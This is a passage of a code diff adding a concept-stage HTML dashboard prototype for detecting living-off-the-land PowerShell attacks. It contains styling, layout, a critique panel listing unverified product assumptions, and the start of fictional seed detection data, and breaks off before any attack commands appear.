@@ -1,0 +1,1520 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>LOTL Detection Dashboard — Tier 1 Concept</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      /* ===== canvas ===== */
+      --bg-app: #0b1220;
+      --bg-surface: #121b2e;
+      --bg-elevated: #182238;
+      --bg-deep: #070d18;
+      --border: #1f2c47;
+      --border-strong: #2a3a5c;
+
+      /* ===== text ===== */
+      --text-primary: #e6edf7;
+      --text-secondary: #9aa8c2;
+      --text-tertiary: #6b7a96;
+      --text-muted: #4b5772;
+
+      /* ===== brand (Adlumin blue) ===== */
+      --brand: #3b82f6;
+      --brand-strong: #2563eb;
+      --brand-soft: rgba(59,130,246,0.14);
+
+      /* ===== status ===== */
+      --critical: #ef4444;  --critical-soft: rgba(239,68,68,0.13);
+      --high: #f97316;      --high-soft: rgba(249,115,22,0.13);
+      --medium: #eab308;    --medium-soft: rgba(234,179,8,0.12);
+      --low: #22c55e;       --low-soft: rgba(34,197,94,0.12);
+
+      /* ===== Bradley / council accent (violet) ===== */
+      --alpha-accent: #a78bfa;  --alpha-soft: rgba(167,139,250,0.13);
+
+      /* ===== DISTINCT SURFACES — topbar + Bradley rail are their OWN color ===== */
+      --topbar-bg: #0a1730;
+      --topbar-border: var(--brand);
+      --rail-bg: #16112e;
+      --rail-border: var(--alpha-accent);
+
+      /* ===== shape + type ===== */
+      --radius-sm: 4px;  --radius-md: 6px;  --radius-lg: 8px;
+      --font-ui: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      --font-mono: 'JetBrains Mono', ui-monospace, monospace;
+    }
+
+    [data-theme="light"] {
+      --bg-app: #f4f6fb;  --bg-surface: #ffffff;  --bg-elevated: #eef1f8;
+      --bg-deep: #e6eaf3; --border: #d8deeb;  --border-strong: #c3ccdd;
+      --text-primary: #0d1424; --text-secondary: #45506b;
+      --text-tertiary: #6b7790; --text-muted: #94a0b8;
+      --topbar-bg: #0a1730;
+      --rail-bg: #f0eafa;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: var(--font-ui);
+      background: var(--bg-app);
+      color: var(--text-primary);
+      line-height: 1.5;
+      overflow-x: hidden;
+    }
+
+    /* ===== Fidelity Banner ===== */
+    .fidelity-banner {
+      background: var(--bg-elevated);
+      border-bottom: 1px solid var(--border);
+      padding: 10px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      font-size: 13px;
+      flex-wrap: wrap;
+    }
+
+    .fidelity-left {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      flex-wrap: wrap;
+    }
+
+    .fidelity-tier {
+      font-family: var(--font-mono);
+      font-weight: 600;
+      color: var(--text-primary);
+    }
+
+    .fidelity-checks {
+      display: flex;
+      gap: 8px;
+      align-items: center;
+      font-size: 12px;
+      color: var(--text-secondary);
+    }
+
+    .fidelity-checks span {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .fidelity-pip {
+      width: 80px;
+      height: 6px;
+      background: var(--bg-deep);
+      border-radius: 3px;
+      overflow: hidden;
+      position: relative;
+    }
+
+    .fidelity-pip-fill {
+      position: absolute;
+      left: 0;
+      top: 0;
+      height: 100%;
+      width: 30%;
+      background: var(--brand);
+      border-radius: 3px;
+    }
+
+    .fidelity-mode-toggle {
+      display: flex;
+      gap: 6px;
+      align-items: center;
+      background: var(--bg-surface);
+      padding: 4px 6px;
+      border-radius: var(--radius-sm);
+      border: 1px solid var(--border);
+      font-size: 11px;
+      font-weight: 500;
+    }
+
+    .fidelity-mode-toggle button {
+      background: transparent;
+      border: none;
+      color: var(--text-tertiary);
+      padding: 4px 8px;
+      border-radius: var(--radius-sm);
+      cursor: pointer;
+      font-size: 11px;
+      font-family: var(--font-ui);
+      transition: all 0.15s;
+    }
+
+    .fidelity-mode-toggle button.active {
+      background: var(--brand-soft);
+      color: var(--brand);
+    }
+
+    /* ===== Topbar ===== */
+    .topbar {
+      background: var(--topbar-bg);
+      border-bottom: 2px solid var(--topbar-border);
+      height: 56px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 20px;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+
+    .topbar-left {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .topbar-logo {
+      font-family: var(--font-mono);
+      font-weight: 700;
+      font-size: 16px;
+      color: var(--brand);
+    }
+
+    .topbar-title {
+      font-family: var(--font-mono);
+      font-weight: 600;
+      font-size: 15px;
+      color: var(--text-primary);
+    }
+
+    .topbar-right {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .topbar-btn {
+      background: var(--bg-surface);
+      border: 1px solid var(--border);
+      color: var(--text-primary);
+      padding: 6px 12px;
+      border-radius: var(--radius-sm);
+      font-size: 13px;
+      font-family: var(--font-ui);
+      font-weight: 500;
+      cursor: pointer;
+      transition: all 0.15s;
+      white-space: nowrap;
+    }
+
+    .topbar-btn:hover {
+      background: var(--bg-elevated);
+      border-color: var(--border-strong);
+    }
+
+    .topbar-btn.council {
+      background: var(--alpha-soft);
+      border-color: var(--alpha-accent);
+      color: var(--alpha-accent);
+    }
+
+    .topbar-btn.council:hover {
+      background: rgba(167,139,250,0.2);
+    }
+
+    .user-chip {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 4px 10px 4px 4px;
+      background: var(--bg-surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-md);
+      font-size: 13px;
+      color: var(--text-primary);
+    }
+
+    .user-avatar {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      background: var(--brand-soft);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: var(--font-mono);
+      font-weight: 600;
+      font-size: 11px;
+      color: var(--brand);
+    }
+
+    /* ===== Layout ===== */
+    .main-layout {
+      display: flex;
+      min-height: calc(100vh - 56px - 41px);
+    }
+
+    /* ===== Sidebar ===== */
+    .sidebar {
+      width: 248px;
+      background: var(--bg-surface);
+      border-right: 1px solid var(--border);
+      padding: 20px 12px;
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+    }
+
+    .sidebar-item {
+      padding: 10px 14px;
+      border-radius: var(--radius-sm);
+      color: var(--text-secondary);
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: all 0.15s;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .sidebar-item:hover {
+      background: var(--bg-elevated);
+      color: var(--text-primary);
+    }
+
+    .sidebar-item.active {
+      background: var(--brand-soft);
+      color: var(--brand);
+    }
+
+    /* ===== Main Content ===== */
+    .main-content {
+      flex: 1;
+      padding: 24px;
+      overflow-y: auto;
+      max-width: calc(100vw - 248px - 420px);
+    }
+
+    .content-header {
+      margin-bottom: 24px;
+    }
+
+    .content-title {
+      font-family: var(--font-mono);
+      font-weight: 700;
+      font-size: 24px;
+      color: var(--text-primary);
+      margin-bottom: 8px;
+    }
+
+    .content-subtitle {
+      font-size: 14px;
+      color: var(--text-secondary);
+    }
+
+    /* ===== Filters ===== */
+    .filters {
+      background: var(--bg-surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-md);
+      padding: 16px;
+      margin-bottom: 20px;
+      display: flex;
+      gap: 12px;
+      flex-wrap: wrap;
+      align-items: end;
+    }
+
+    .filter-group {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .filter-label {
+      font-size: 12px;
+      font-weight: 500;
+      color: var(--text-tertiary);
+      font-family: var(--font-mono);
+    }
+
+    .filter-input {
+      background: var(--bg-elevated);
+      border: 1px solid var(--border);
+      color: var(--text-primary);
+      padding: 6px 10px;
+      border-radius: var(--radius-sm);
+      font-size: 13px;
+      font-family: var(--font-ui);
+      min-width: 140px;
+    }
+
+    .filter-input:focus {
+      outline: none;
+      border-color: var(--brand);
+    }
+
+    .filter-btn {
+      background: var(--brand);
+      border: none;
+      color: white;
+      padding: 7px 16px;
+      border-radius: var(--radius-sm);
+      font-size: 13px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: all 0.15s;
+    }
+
+    .filter-btn:hover {
+      background: var(--brand-strong);
+    }
+
+    /* ===== Summary Stats ===== */
+    .summary-stats {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 16px;
+      margin-bottom: 24px;
+    }
+
+    .stat-card {
+      background: var(--bg-surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-md);
+      padding: 16px;
+    }
+
+    .stat-label {
+      font-size: 12px;
+      font-weight: 500;
+      color: var(--text-tertiary);
+      font-family: var(--font-mono);
+      margin-bottom: 8px;
+    }
+
+    .stat-value {
+      font-family: var(--font-mono);
+      font-weight: 700;
+      font-size: 28px;
+      color: var(--text-primary);
+      margin-bottom: 4px;
+    }
+
+    .stat-note {
+      font-size: 11px;
+      color: var(--text-muted);
+    }
+
+    /* ===== Detection Events ===== */
+    .detections-list {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .detection-card {
+      background: var(--bg-surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-md);
+      overflow: hidden;
+      transition: all 0.2s;
+    }
+
+    .detection-card:hover {
+      border-color: var(--border-strong);
+    }
+
+    .detection-header {
+      padding: 14px 16px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      cursor: pointer;
+      user-select: none;
+    }
+
+    .detection-expand {
+      width: 20px;
+      height: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--text-tertiary);
+      font-size: 18px;
+      transition: transform 0.2s;
+    }
+
+    .detection-card.expanded .detection-expand {
+      transform: rotate(90deg);
+    }
+
+    .detection-id {
+      font-family: var(--font-mono);
+      font-size: 12px;
+      color: var(--text-muted);
+      min-width: 100px;
+    }
+
+    .detection-type {
+      flex: 1;
+      font-size: 14px;
+      font-weight: 500;
+      color: var(--text-primary);
+    }
+
+    .detection-timestamp {
+      font-size: 12px;
+      color: var(--text-tertiary);
+      font-family: var(--font-mono);
+    }
+
+    .detection-confidence {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 4px 10px;
+      background: var(--bg-elevated);
+      border-radius: var(--radius-sm);
+      font-size: 13px;
+      font-family: var(--font-mono);
+      font-weight: 600;
+    }
+
+    .confidence-bar {
+      width: 60px;
+      height: 6px;
+      background: var(--bg-deep);
+      border-radius: 3px;
+      overflow: hidden;
+      position: relative;
+    }
+
+    .confidence-fill {
+      position: absolute;
+      left: 0;
+      top: 0;
+      height: 100%;
+      background: var(--brand);
+      border-radius: 3px;
+    }
+
+    .detection-severity {
+      padding: 4px 10px;
+      border-radius: var(--radius-sm);
+      font-size: 12px;
+      font-weight: 600;
+      font-family: var(--font-mono);
+    }
+
+    .severity-critical {
+      background: var(--critical-soft);
+      color: var(--critical);
+    }
+
+    .severity-high {
+      background: var(--high-soft);
+      color: var(--high);
+    }
+
+    .severity-medium {
+      background: var(--medium-soft);
+      color: var(--medium);
+    }
+
+    .severity-low {
+      background: var(--low-soft);
+      color: var(--low);
+    }
+
+    .detection-action {
+      padding: 4px 12px;
+      border-radius: var(--radius-sm);
+      font-size: 12px;
+      font-weight: 500;
+      border: 1px solid var(--border);
+      background: var(--bg-elevated);
+      color: var(--text-secondary);
+    }
+
+    .detection-details {
+      display: none;
+      padding: 16px;
+      border-top: 1px solid var(--border);
+      background: var(--bg-deep);
+    }
+
+    .detection-card.expanded .detection-details {
+      display: block;
+    }
+
+    .detail-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 16px;
+      margin-bottom: 12px;
+    }
+
+    .detail-item {
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+    }
+
+    .detail-label {
+      font-size: 11px;
+      font-weight: 500;
+      color: var(--text-tertiary);
+      font-family: var(--font-mono);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .detail-value {
+      font-size: 13px;
+      color: var(--text-primary);
+      font-family: var(--font-mono);
+    }
+
+    .detail-command {
+      margin-top: 12px;
+    }
+
+    .command-block {
+      background: var(--bg-surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-sm);
+      padding: 10px;
+      font-family: var(--font-mono);
+      font-size: 12px;
+      color: var(--text-primary);
+      overflow-x: auto;
+      white-space: pre-wrap;
+      word-break: break-all;
+    }
+
+    /* ===== Bradley Rail ===== */
+    .bradley-rail {
+      width: 420px;
+      background: var(--rail-bg);
+      border-left: 4px solid var(--rail-border);
+      box-shadow: inset 6px 0 14px -10px rgba(167,139,250,0.5);
+      padding: 24px 20px;
+      overflow-y: auto;
+      position: relative;
+    }
+
+    .bradley-rail::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: repeating-linear-gradient(
+        45deg,
+        transparent,
+        transparent 20px,
+        rgba(167,139,250,0.03) 20px,
+        rgba(167,139,250,0.03) 40px
+      );
+      pointer-events: none;
+    }
+
+    .rail-content {
+      position: relative;
+      z-index: 1;
+    }
+
+    .rail-section {
+      margin-bottom: 24px;
+    }
+
+    .rail-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 6px 12px;
+      background: var(--alpha-soft);
+      border: 1px solid var(--alpha-accent);
+      border-radius: var(--radius-md);
+      font-family: var(--font-mono);
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--alpha-accent);
+      margin-bottom: 16px;
+    }
+
+    .rail-title {
+      font-family: var(--font-mono);
+      font-weight: 700;
+      font-size: 16px;
+      color: var(--text-primary);
+      margin-bottom: 8px;
+      cursor: pointer;
+      user-select: none;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .rail-collapse-icon {
+      font-size: 14px;
+      color: var(--text-tertiary);
+      transition: transform 0.2s;
+    }
+
+    .rail-section.collapsed .rail-collapse-icon {
+      transform: rotate(-90deg);
+    }
+
+    .rail-blurb {
+      font-size: 13px;
+      color: var(--text-secondary);
+      line-height: 1.6;
+      margin-bottom: 20px;
+    }
+
+    .rail-list {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      margin-bottom: 16px;
+    }
+
+    .rail-section.collapsed .rail-list {
+      display: none;
+    }
+
+    .rail-list-item {
+      font-size: 13px;
+      color: var(--text-secondary);
+      padding-left: 16px;
+      position: relative;
+      line-height: 1.5;
+    }
+
+    .rail-list-item::before {
+      content: '→';
+      position: absolute;
+      left: 0;
+      color: var(--alpha-accent);
+      font-weight: 600;
+    }
+
+    .routing-cards {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    .routing-card {
+      background: var(--bg-surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-md);
+      padding: 14px;
+    }
+
+    .routing-header {
+      font-family: var(--font-mono);
+      font-weight: 700;
+      font-size: 13px;
+      color: var(--text-primary);
+      margin-bottom: 10px;
+      padding-bottom: 8px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .routing-section {
+      margin-bottom: 10px;
+    }
+
+    .routing-section:last-child {
+      margin-bottom: 0;
+    }
+
+    .routing-label {
+      font-size: 11px;
+      font-weight: 600;
+      color: var(--text-tertiary);
+      font-family: var(--font-mono);
+      margin-bottom: 4px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .routing-text {
+      font-size: 12px;
+      color: var(--text-secondary);
+      line-height: 1.5;
+    }
+
+    .routing-roi {
+      margin-top: 10px;
+      padding-top: 10px;
+      border-top: 1px solid var(--border);
+    }
+
+    /* ===== Council Modal ===== */
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0,0,0,0.7);
+      z-index: 1000;
+      align-items: center;
+      justify-content: center;
+      padding: 40px;
+    }
+
+    .modal-overlay.active {
+      display: flex;
+    }
+
+    .modal {
+      background: var(--bg-surface);
+      border: 1px solid var(--border-strong);
+      border-radius: var(--radius-lg);
+      max-width: 900px;
+      width: 100%;
+      max-height: 90vh;
+      overflow-y: auto;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+    }
+
+    .modal-header {
+      padding: 20px 24px;
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: var(--bg-elevated);
+    }
+
+    .modal-title {
+      font-family: var(--font-mono);
+      font-weight: 700;
+      font-size: 18px;
+      color: var(--text-primary);
+    }
+
+    .modal-close {
+      background: transparent;
+      border: none;
+      color: var(--text-tertiary);
+      font-size: 24px;
+      cursor: pointer;
+      padding: 0;
+      width: 32px;
+      height: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: var(--radius-sm);
+      transition: all 0.15s;
+    }
+
+    .modal-close:hover {
+      background: var(--bg-deep);
+      color: var(--text-primary);
+    }
+
+    .modal-body {
+      padding: 24px;
+    }
+
+    .modal-placeholder {
+      background: var(--bg-elevated);
+      border: 1px dashed var(--border);
+      border-radius: var(--radius-md);
+      padding: 40px 24px;
+      text-align: center;
+      color: var(--text-tertiary);
+      font-size: 14px;
+      line-height: 1.6;
+    }
+
+    .modal-placeholder strong {
+      display: block;
+      font-family: var(--font-mono);
+      font-size: 16px;
+      color: var(--text-primary);
+      margin-bottom: 12px;
+    }
+
+    /* ===== Responsive ===== */
+    @media (max-width: 1400px) {
+      .main-content {
+        max-width: calc(100vw - 248px);
+      }
+      .bradley-rail {
+        display: none;
+      }
+      body.rail-visible .main-layout {
+        position: relative;
+      }
+      body.rail-visible .bradley-rail {
+        display: block;
+        position: fixed;
+        right: 0;
+        top: 56px;
+        bottom: 0;
+        z-index: 90;
+      }
+    }
+
+    @media (max-width: 900px) {
+      .sidebar {
+        width: 60px;
+        padding: 20px 8px;
+      }
+      .sidebar-item {
+        justify-content: center;
+        padding: 10px;
+      }
+      .sidebar-item span {
+        display: none;
+      }
+      .main-content {
+        max-width: calc(100vw - 60px);
+      }
+    }
+
+    /* ===== Tooltips ===== */
+    .tooltip {
+      position: relative;
+      cursor: help;
+    }
+
+    .tooltip::after {
+      content: attr(data-tooltip);
+      position: absolute;
+      bottom: 100%;
+      left: 50%;
+      transform: translateX(-50%);
+      background: var(--bg-elevated);
+      border: 1px solid var(--border-strong);
+      padding: 6px 10px;
+      border-radius: var(--radius-sm);
+      font-size: 11px;
+      color: var(--text-primary);
+      white-space: nowrap;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.2s;
+      margin-bottom: 6px;
+      z-index: 1000;
+    }
+
+    .tooltip:hover::after {
+      opacity: 1;
+    }
+  </style>
+</head>
+<body data-theme="dark">
+
+  <!-- Fidelity Banner -->
+  <div class="fidelity-banner">
+    <div class="fidelity-left">
+      <span class="fidelity-tier">[T1 · Concept]</span>
+      <div class="fidelity-checks">
+        <span>✓ Three-gate brief</span>
+        <span>✓ Domain model</span>
+        <span>✓ Critic pre-build (23/30)</span>
+        <span>⚠ [A] = 29.2%</span>
+        <span>⚠ Test plan undefined</span>
+      </div>
+      <div class="fidelity-pip">
+        <div class="fidelity-pip-fill"></div>
+      </div>
+    </div>
+    <div class="fidelity-mode-toggle">
+      <button id="mode-light">Light</button>
+      <button id="mode-dark" class="active">Dark</button>
+      <button id="mode-system">System</button>
+    </div>
+  </div>
+
+  <!-- Topbar -->
+  <div class="topbar">
+    <div class="topbar-left">
+      <div class="topbar-logo">ADLUMIN</div>
+      <div class="topbar-title">LOTL Detection Dashboard</div>
+    </div>
+    <div class="topbar-right">
+      <button class="topbar-btn council" id="council-btn">Council (44 voices)</button>
+      <button class="topbar-btn" id="rail-toggle">Bradley Rail</button>
+      <div class="user-chip">
+        <div class="user-avatar">S</div>
+        <span>Sabrina</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Main Layout -->
+  <div class="main-layout">
+
+    <!-- Sidebar -->
+    <div class="sidebar">
+      <div class="sidebar-item active">
+        <span>📊</span>
+        <span>Dashboard</span>
+      </div>
+      <div class="sidebar-item">
+        <span>🔍</span>
+        <span>Detections</span>
+      </div>
+      <div class="sidebar-item">
+        <span>📄</span>
+        <span>Reports</span>
+      </div>
+      <div class="sidebar-item">
+        <span>⚙️</span>
+        <span>Settings</span>
+      </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="main-content">
+
+      <div class="content-header">
+        <div class="content-title">LOTL Detection Dashboard</div>
+        <div class="content-subtitle">Living Off The Land attacks detected via PowerShell Ensemble + Identity Telemetry</div>
+      </div>
+
+      <!-- Filters -->
+      <div class="filters">
+        <div class="filter-group">
+          <div class="filter-label">DATE RANGE</div>
+          <select class="filter-input" id="filter-date">
+            <option>Last 7 days</option>
+            <option>Last 30 days</option>
+            <option>Last 90 days</option>
+          </select>
+        </div>
+        <div class="filter-group">
+          <div class="filter-label">SEVERITY</div>
+          <select class="filter-input" id="filter-severity">
+            <option value="">All</option>
+            <option value="critical">Critical</option>
+            <option value="high">High</option>
+            <option value="medium">Medium</option>
+            <option value="low">Low</option>
+          </select>
+        </div>
+        <div class="filter-group">
+          <div class="filter-label">CONFIDENCE THRESHOLD</div>
+          <select class="filter-input" id="filter-confidence">
+            <option value="0">All (0%+)</option>
+            <option value="60">Medium (60%+)</option>
+            <option value="80">High (80%+)</option>
+          </select>
+        </div>
+        <button class="filter-btn" id="apply-filters">Apply</button>
+      </div>
+
+      <!-- Summary Stats -->
+      <div class="summary-stats">
+        <div class="stat-card">
+          <div class="stat-label">TOTAL LOTL DETECTIONS</div>
+          <div class="stat-value">147</div>
+          <div class="stat-note">Last 7 days</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">HIGH-CONFIDENCE RATE</div>
+          <div class="stat-value">62%</div>
+          <div class="stat-note">&gt;80% confidence threshold</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">AVG TRIAGE TIME</div>
+          <div class="stat-value">12 min</div>
+          <div class="stat-note">Baseline TBD — fictional seed data</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">ALERT FATIGUE RISK</div>
+          <div class="stat-value">—</div>
+          <div class="stat-note">Baseline not measured</div>
+        </div>
+      </div>
+
+      <!-- Detection Events -->
+      <div class="detections-list" id="detections-list">
+        <!-- Detection cards will be populated by JS -->
+      </div>
+
+    </div>
+
+    <!-- Bradley Rail -->
+    <div class="bradley-rail">
+      <div class="rail-content">
+
+        <div class="rail-badge">
+          <span>Tier 1 · Concept</span>
+          <span>·</span>
+          <span>12/20</span>
+          <span>·</span>
+          <span>[A]+[?] 43.75%</span>
+        </div>
+
+        <div class="rail-section">
+          <div class="rail-blurb">
+            <strong>Tests strategic positioning:</strong> Does naming LOTL capability improve competitive position vs. CrowdStrike Charlotte, Palo Alto XSIAM, SentinelOne Purple AI?
+          </div>
+        </div>
+
+        <div class="rail-section collapsed">
+          <div class="rail-title" data-toggle-section>
+            <span class="rail-collapse-icon">▼</span>
+            What you nailed
+          </div>
+          <div class="rail-list">
+            <div class="rail-list-item">Three-gate structure clearly separates problem, right thing, built right</div>
+            <div class="rail-list-item">Claim tagging [R]/[D]/[A]/[?] applied inline, evidence ratio named upfront</div>
+            <div class="rail-list-item">Honest sourcing: "This brief is not ready for high-fidelity build" stated explicitly</div>
+            <div class="rail-list-item">Domain model defines entities, value objects, services with evidence tags</div>
+            <div class="rail-list-item">Failure modes named: narrative collision, AI transparency failure</div>
+          </div>
+        </div>
+
+        <div class="rail-section">
+          <div class="rail-title" data-toggle-section>
+            <span class="rail-collapse-icon">▼</span>
+            What will hurt you
+          </div>
+          <div class="rail-list">
+            <div class="rail-list-item">Strategic positioning claim is [A] — no customer interviews, win/loss analysis, or MSP feedback</div>
+            <div class="rail-list-item">Competitor claims not verified from primary sources (CrowdStrike "~85% workload reduction" from secondary)</div>
+            <div class="rail-list-item">No baseline for counter-metric (alert fatigue) — cannot test increase/reduction without starting point</div>
+            <div class="rail-list-item">No differentiation claim — what makes Adlumin LOTL detection better than competitors?</div>
+          </div>
+        </div>
+
+        <div class="rail-section">
+          <div class="rail-title" style="margin-bottom: 16px;">Routed Cards</div>
+          <div class="routing-cards">
+
+            <div class="routing-card">
+              <div class="routing-header">PRODUCT</div>
+              <div class="routing-section">
+                <div class="routing-label">Does</div>
+                <div class="routing-text">Define "LOTL visibility" operationally (filter? tag? dedicated view?). Validate strategic claim with MSP interviews.</div>
+              </div>
+              <div class="routing-section">
+                <div class="routing-label">Why Now</div>
+                <div class="routing-text">Dashboard UX is undefined [?]. Strategic claim is [A].</div>
+              </div>
+              <div class="routing-section">
+                <div class="routing-label">If You Ship Without It</div>
+                <div class="routing-text">Dashboard tests wrong question; build is wasted if MSPs don't care about LOTL taxonomy.</div>
+              </div>
+              <div class="routing-roi">
+                <div class="routing-label">ROI</div>
+                <div class="routing-text"><strong>Business:</strong> Unknown — hypothetical "$600K/year at risk" not based on lost deal data.</div>
+                <div class="routing-text"><strong>User:</strong> Unknown — no baseline triage time or FPR.</div>
+                <div class="routing-text"><strong>Unknown:</strong> Do MSPs recognize "LOTL" as distinct category?</div>
+              </div>
+            </div>
+
+            <div class="routing-card">
+              <div class="routing-header">DESIGN</div>
+              <div class="routing-section">
+                <div class="routing-label">Does</div>
+                <div class="routing-text">Validate whether AI confidence scoring reduces triage time or increases confusion. Test dashboard with/without LOTL label (A/B test or MSP feedback).</div>
+              </div>
+              <div class="routing-section">
+                <div class="routing-label">Why Now</div>
+                <div class="routing-text">"AI transparency failure" risk named but not mitigated [?].</div>
+              </div>
+              <div class="routing-section">
+                <div class="routing-label">If You Ship Without It</div>
+                <div class="routing-text">Confidence scores become decoration; analysts ignore or distrust them.</div>
+              </div>
+              <div class="routing-roi">
+                <div class="routing-label">ROI</div>
+                <div class="routing-text"><strong>Business:</strong> Unknown — no AI detection performance baseline.</div>
+                <div class="routing-text"><strong>User:</strong> Unknown — analyst workload reduction unverified.</div>
+                <div class="routing-text"><strong>Unknown:</strong> Does scoring reduce cognitive load or add it?</div>
+              </div>
+            </div>
+
+            <div class="routing-card">
+              <div class="routing-header">RESEARCH</div>
+              <div class="routing-section">
+                <div class="routing-label">Does</div>
+                <div class="routing-text">Baseline alert fatigue (current FPR, analyst workload, triage time for PowerShell Ensemble alerts). Interview 5 MSPs per OKR: do they recognize "LOTL" term? Care about taxonomy or outcomes?</div>
+              </div>
+              <div class="routing-section">
+                <div class="routing-label">Why Now</div>
+                <div class="routing-text">Counter-metric (alert fatigue) not baselined [?]. Entire prototype hinges on unvalidated [A] claim.</div>
+              </div>
+              <div class="routing-section">
+                <div class="routing-label">If You Ship Without It</div>
+                <div class="routing-text">Cannot test whether dashboard increases or reduces fatigue. Narrative collision risk unmitigated.</div>
+              </div>
+              <div class="routing-roi">
+                <div class="routing-label">ROI</div>
+                <div class="routing-text"><strong>Business:</strong> Unknown — strategic ROI is positional, not measurable from current data.</div>
+                <div class="routing-text"><strong>User:</strong> Unknown — no validated personas (PUT-1152 planned Q3).</div>
+                <div class="routing-text"><strong>Unknown:</strong> Is LOTL a recognized problem category for MSPs?</div>
+              </div>
+            </div>
+
+            <div class="routing-card">
+              <div class="routing-header">ENGINEERING</div>
+              <div class="routing-section">
+                <div class="routing-label">Does</div>
+                <div class="routing-text">Verify PowerShell Ensemble detection volume (~1B commands/week claim from ADL-1381). Document RACE output format (severity, confidence, recommended action). Define how dashboard queries detection data (API? database? real-time stream?).</div>
+              </div>
+              <div class="routing-section">
+                <div class="routing-label">Why Now</div>
+                <div class="routing-text">Seed data is fictional [A]; real data schema undefined [?].</div>
+              </div>
+              <div class="routing-section">
+                <div class="routing-label">If You Ship Without It</div>
+                <div class="routing-text">Prototype works as concept but cannot transition to production without rework.</div>
+              </div>
+              <div class="routing-roi">
+                <div class="routing-label">ROI</div>
+                <div class="routing-text"><strong>Business:</strong> Unknown — implementation cost not estimated.</div>
+                <div class="routing-text"><strong>User:</strong> N/A (backend work).</div>
+                <div class="routing-text"><strong>Unknown:</strong> Is real-time detection feed feasible at stated volume?</div>
+              </div>
+            </div>
+
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+  </div>
+
+  <!-- Council Modal -->
+  <div class="modal-overlay" id="council-modal">
+    <div class="modal">
+      <div class="modal-header">
+        <div class="modal-title">Council (44 voices) — Hard Mode</div>
+        <button class="modal-close" id="modal-close-btn">×</button>
+      </div>
+      <div class="modal-body">
+        <div class="modal-placeholder">
+          <strong>Council testimony will be populated in Step 6</strong>
+          <p>This prototype tests strategic positioning. Council pass will surface tensions across 14 frameworks (Jobs-to-Be-Done, Service Blueprint, Self-Determination Theory, Disruptive Innovation, Value Chain, and 39 others).</p>
+          <p><strong>Expected structure:</strong></p>
+          <ul style="text-align: left; max-width: 600px; margin: 16px auto; line-height: 1.8;">
+            <li>Executive Summary (readiness score, top 3 tensions)</li>
+            <li>14 clusters, 44 voice cards, owensed testimony</li>
+            <li>Cross-talk section (Direct Response, Blind-spot Supply, Productive Tension)</li>
+            <li>0% Claude synthesis slot — human fills</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // ===== Detection Events (Fictional Seed Data) =====
+    const detections = [
+      {
+        id: 'DET-8472',
+        type: 'PowerShell: Suspicious Script Execution',
+        timestamp: '2026-06-04 14:23:17',
+        confidence: 89,
+        severity: 'critical',
+        action: 'Investigate',
+        user: 'jdavis@techcorp-msp.local',
+        endpoint: 'DESKTOP-A4F2',
